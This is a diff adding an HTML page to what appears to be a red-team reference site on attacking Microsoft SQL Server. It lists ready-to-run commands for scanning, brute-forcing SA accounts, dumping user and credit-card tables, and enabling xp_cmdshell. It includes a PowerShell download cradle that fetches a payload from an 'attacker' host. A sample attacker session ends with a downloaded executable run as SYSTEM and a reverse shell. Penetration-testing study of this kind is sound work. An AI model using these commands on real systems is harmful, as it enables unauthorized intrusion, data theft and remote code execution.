@@ -1,0 +1,199 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">MSSQL Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Databases</strong> • Focus: <strong>MSSQL Abuse & xp_cmdshell RCE</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Microsoft SQL Server (MSSQL, TCP/1433) is a relational database platform 
+    integrated with Windows environments. Attackers target MSSQL for brute 
+    forcing weak accounts, enumerating databases, extracting sensitive data, 
+    and executing system commands via features like <code>xp_cmdshell</code>. 
+    Misconfigurations, such as SA accounts with weak passwords or excessive 
+    privileges, often lead to full system compromise and domain escalation. 
+    MSSQL exploitation is a common lateral movement technique in Red Team ops.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>Weak SA Passwords:</strong> "sa:password123" still exists in many systems.</li>
+    <li><strong>Windows Authentication:</strong> Credential reuse allows silent login.</li>
+    <li><strong>xp_cmdshell Abuse:</strong> Enables direct OS-level command execution.</li>
+    <li><strong>Linked Servers:</strong> Lateral movement via linked MSSQL instances.</li>
+    <li><strong>Misconfigured Privileges:</strong> Users often have db_owner/sysadmin roles.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify MSSQL service on TCP/1433.</li>
+    <li><strong>Authentication:</strong> Attempt login via SQL auth or Windows auth.</li>
+    <li><strong>Enumeration:</strong> List users, roles, databases, and linked servers.</li>
+    <li><strong>Exfiltration:</strong> Dump sensitive tables (credentials, payments, tokens).</li>
+    <li><strong>Exploitation:</strong> Enable and abuse <code>xp_cmdshell</code> for RCE.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan for MSSQL on TCP/1433.</li>
+    <li>Brute force or test default SA credentials.</li>
+    <li>Enumerate users, roles, and databases.</li>
+    <li>Extract sensitive data via SQL queries.</li>
+    <li>Enable <code>xp_cmdshell</code> and gain OS command execution.</li>
+    <li>Leverage linked servers for lateral movement.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p1433 --script ms-sql-info,ms-sql-empty-password [target]
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -L users.txt -P rockyou.txt mssql://[target]
+
+# ------------------------------
+# Connect
+# ------------------------------
+sqsh -S [target] -U sa -P password123
+impacket-mssqlclient sa:password123@[target]
+
+# ------------------------------
+# Enumeration
+# ------------------------------
+SELECT name FROM sys.databases;
+SELECT name, permission_name FROM sys.database_permissions;
+SELECT srvname, srvproduct FROM sysservers;
+
+# ------------------------------
+# Dump Data
+# ------------------------------
+SELECT * FROM users;
+SELECT * FROM credit_cards;
+
+# ------------------------------
+# Enable and Abuse xp_cmdshell
+# ------------------------------
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://attacker/payload.ps1'')"';
+
+# ------------------------------
+# Linked Server Abuse
+# ------------------------------
+SELECT * FROM OPENQUERY("LINKEDSRV", 'SELECT @@version');
+EXEC ("xp_cmdshell ''whoami''") AT LINKEDSRV;
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p1433 192.168.1.140 --script ms-sql-info
+impacket-mssqlclient sa:Summer2025!@192.168.1.140
+EXEC xp_cmdshell 'whoami'
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p1433 --script ms-sql-info 192.168.1.140
+PORT     STATE SERVICE
+1433/tcp open  ms-sql-s
+| ms-sql-info:
+|   Server name: SQL-SERVER
+|   Version: Microsoft SQL Server 2017
+
+[ saide ~ ]$ impacket-mssqlclient sa:Summer2025!@192.168.1.140
+[*] Encryption required, switching to TLS
+[*] Authentication successful
+
+SQL> SELECT name FROM sys.databases;
+master
+tempdb
+finance
+
+SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+SQL> EXEC xp_cmdshell 'whoami';
+nt authority\system
+
+[+] RCE on SQL-SERVER as SYSTEM
+
+SQL> EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker/payload.exe -OutFile C:\\payload.exe"';
+SQL> EXEC xp_cmdshell 'C:\\payload.exe';
+[+] Payload executed → Reverse shell opened
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample MSSQL exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+1433/tcp open  Microsoft SQL Server 2017
+
+# Weak Credentials
+sa : Summer2025!
+
+# Exploitation
+xp_cmdshell enabled
+Executed commands as nt authority\system
+
+# Proof of Exploitation
+Extracted finance database
+Reverse shell deployed from MSSQL
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting MSSQL
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1505/002/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – SQL Stored Procedures
+      </a>
+    </li>
+    <li>Red Team workflow: Scan → Brute force → Enum → Dump data → xp_cmdshell RCE → Lateral movement via linked servers.</li>
+  </ul>
+</section>
